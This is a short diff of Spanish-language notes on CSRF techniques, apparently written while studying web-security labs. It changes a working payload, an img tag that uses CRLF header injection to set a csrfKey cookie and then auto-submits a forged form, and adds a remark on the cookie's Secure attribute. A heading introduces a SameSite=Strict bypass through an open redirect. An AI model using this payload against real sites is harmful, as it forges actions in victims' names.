@@ -15,8 +15,9 @@
     <input type="submit" value="Submit request" />
 </form>
 
-<img src="https://URL/?search=test%0d%0aSet-Cookie:%20csrfKey=BfSlrsokL2VXRM9P5dfS58XmlkZG9Hzp%3b%20Samesite=None%3b%20Secure" onerror="document.forms[0].submit();">
+<img src="https://URL/?search=test%0d%0aSet-Cookie:%20csrfKey=BfSlrsokL2VXRM9P5dfS58XmlkZG9Hzp%3b%20Samesite=None" onerror="document.forms[0].submit();">
 ```
+*Aclaracion:* Por lo general no hace falta agregar el %3b%20Secure, pero si no lo agrega habrai que ponerlo nosotros.
 
 - Aprovechando de un open-redirect para bypassear la restriccion Samesite=Strict
 ```html
